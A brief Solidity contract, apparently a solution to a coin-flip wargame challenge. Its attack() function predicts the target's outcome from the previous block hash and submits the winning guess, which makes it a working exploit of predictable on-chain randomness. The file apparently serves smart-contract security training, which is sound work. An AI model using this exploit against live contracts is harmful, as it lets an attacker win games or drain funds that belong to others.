// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlip private coinFlipContract;

    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContract) {
        coinFlipContract = ICoinFlip(_coinFlipContract);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool guess = coinFlip == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}
